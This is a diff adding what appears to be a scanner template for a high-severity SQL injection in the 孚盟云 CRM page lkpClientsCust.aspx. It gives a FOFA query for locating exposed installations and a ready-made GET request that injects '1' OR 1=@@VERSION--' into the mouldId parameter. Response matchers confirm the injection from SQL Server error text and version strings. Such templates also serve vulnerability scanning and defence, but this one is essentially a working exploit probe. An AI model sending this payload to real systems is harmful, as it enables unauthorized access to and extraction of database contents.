@@ -1,0 +1,24 @@
+## id: VEID-2026-11107
+## name: 孚盟云 lkpClientsCust.aspx SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 孚盟云 lkpClientsCust.aspx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 孚盟云
+## fofa-query: app="孚盟软件-孚盟云"
+## verification: true
+
+
+
+GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=@@VERSION-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: body contains "Microsoft SQL Server 2008 R2" || body contains "转换成数据类型 int 时失败"
+#@ matcher: body contains "1' OR 1=@@VERSION--"
+#@ matcher: status_code == 500
+
+
+# @VEIL-STAMP: 317a602974d1042cd7b862e914c1a7ef6b002075e5d77ccb4002248742b514d5
